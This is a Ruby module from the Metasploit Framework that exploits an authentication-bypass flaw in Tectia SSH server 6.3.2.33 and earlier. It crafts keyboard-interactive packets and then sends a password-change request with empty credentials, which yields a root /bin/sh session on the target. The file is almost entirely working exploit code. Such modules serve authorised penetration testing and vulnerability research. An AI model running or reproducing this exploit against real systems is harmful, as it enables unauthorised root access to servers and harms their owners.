# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;
require &#039;net/ssh&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Tectia SSH USERAUTH Change Request Password Reset Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in Tectia SSH server for Unix-based
        platforms.  The bug is caused by a SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ request
        before password authentication, allowing any remote user to bypass the login
        routine, and then gain access as root.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;kingcope&#039;,  #Original 0day
          &#039;bperry&#039;,
          &#039;sinn3r&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;23082&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2012/Dec/12&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; =>
          {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;
          }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Unix-based Tectia SSH 6.3.2.33 or prior&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Dec 01 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(22),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;, &#039;root&#039;])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end

  def check
    connect
    banner = sock.get_once
    print_status("#{rhost}:#{rport} - #{banner}")
    disconnect

    return Exploit::CheckCode::Appears if banner =~ /SSH Tectia/
    return Exploit::CheckCode::Safe
  end

  def rhost
    datastore[&#039;RHOST&#039;]
  end

  def rport
    datastore[&#039;RPORT&#039;]
  end

  #
  # This is where the login begins.  We&#039;re expected to use the keyboard-interactive method to
  # authenticate, but really all we want is skipping it so we can move on to the password
  # method authentication.
  #
  def auth_keyboard_interactive(user, transport)
    print_status("#{rhost}:#{rport} - Going through keyboard-interactive auth...")
    auth_req_pkt = Net::SSH::Buffer.from(
      :byte, 0x32,                     #userauth request
      :string, user,                   #username
      :string, "ssh-connection",       #service
      :string, "keyboard-interactive", #method name
      :string, "",                     #lang
      :string, ""
    )

    user_auth_pkt = Net::SSH::Buffer.from(
      :byte, 0x3D,                     #userauth info
      :raw, 0x01,                      #number of prompts
      :string, "",                     #password
      :raw, "\0"*32                    #padding
    )

    transport.send_message(auth_req_pkt)
    message = transport.next_message
    vprint_status("#{rhost}:#{rport} - Authentication to continue: keyboard-interactive")

    message = transport.next_message
    vprint_status("#{rhost}:#{rport} - Password prompt: #{message.inspect}")

    # USERAUTH INFO
    transport.send_message(user_auth_pkt)
    message = transport.next_message
    vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")

    2.times do |i|
      #USRAUTH REQ
      transport.send_message(auth_req_pkt)
      message = transport.next_message
      vprint_status("#{rhost}:#{rport} - Password prompt: #{message.inspect}")

      # USERAUTH INFO
      transport.send_message(user_auth_pkt)
      message = transport.next_message
      vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")
    end
  end


  #
  # The following link is useful to understand how to craft the USERAUTH password change
  # request packet:
  # http://fossies.org/dox/openssh-6.1p1/sshconnect2_8c_source.html#l00903
  #
  def userauth_passwd_change(user, transport, connection)
    print_status("#{rhost}:#{rport} - Sending USERAUTH Change request...")
    pkt = Net::SSH::Buffer.from(
      :byte, 0x32,               #userauth request
      :string, user,             #username
      :string, "ssh-connection", #service
      :string, "password"        #method name
    )
    pkt.write_bool(true)
    pkt.write_string("")           #Old pass
    pkt.write_string("")           #New pass

    transport.send_message(pkt)
    message = transport.next_message.type
    vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")

    if message.to_i == 52 #SSH2_MSG_USERAUTH_SUCCESS
      transport.send_message(transport.service_request("ssh-userauth"))
      message = transport.next_message.type

      if message.to_i == 6 #SSH2_MSG_SERVICE_ACCEPT
        shell = Net::SSH::CommandStream.new(connection, &#039;/bin/sh&#039;, true)
        connection = nil
        return shell
      end
    end
  end

  def do_login(user)
    opts       = {:user=>user, :record_auth_info=>true}
    options    = Net::SSH::Config.for(rhost, Net::SSH::Config.default_files).merge(opts)
    transport  = Net::SSH::Transport::Session.new(rhost, options)
    connection = Net::SSH::Connection::Session.new(transport, options)
    auth_keyboard_interactive(user, transport)
    userauth_passwd_change(user, transport, connection)
  end

  def exploit
    # Our keyboard-interactive is specific to Tectia.  This allows us to run quicker when we&#039;re
    # engaging a variety of SSHD targets on a network.
    if check != Exploit::CheckCode::Appears
      print_error("#{rhost}:#{rport} - Host does not seem vulnerable, will not engage.")
      return
    end

    c = nil

    begin
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        c = do_login(datastore[&#039;USERNAME&#039;])
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    end

    handler(c.lsock) if c
  end
end

